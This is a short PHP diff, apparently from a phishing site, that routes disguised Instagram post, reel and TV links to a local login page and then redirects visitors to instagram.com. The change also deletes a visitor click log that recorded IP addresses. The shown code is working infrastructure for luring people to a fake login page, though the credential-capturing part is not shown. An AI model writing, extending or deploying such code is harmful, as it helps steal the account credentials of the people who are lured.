@@ -30,19 +30,13 @@ if (preg_match('#^/(p|reel|tv)/([a-zA-Z0-9_-]+)/?$#', $path, $matches)) {
     // Get original URL from mappings
     $original_url = getOriginalUrl($code);
     
-    // Store in session for redirect after login
-    session_start();
+    // Start session only if not already started
+    if (session_status() === PHP_SESSION_NONE) {
+        session_start();
+    }
+    
     $_SESSION['redirect_url'] = $original_url ?: 'https://www.instagram.com/';
     $_SESSION['link_code'] = $code;
-    
-    // Log the click
-    $log_file = __DIR__ . "/clicks_log.txt";
-    $ip = $_SERVER['REMOTE_ADDR'];
-    $timestamp = date("Y-m-d H:i:s");
-    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
-    
-    $log_entry = "[{$timestamp}] Type: {$type} | Code: {$code} | IP: {$ip} | Redirect: {$original_url}\n";
-    file_put_contents($log_file, $log_entry, FILE_APPEND);
     
     // Show login page
     include __DIR__ . '/login.php';
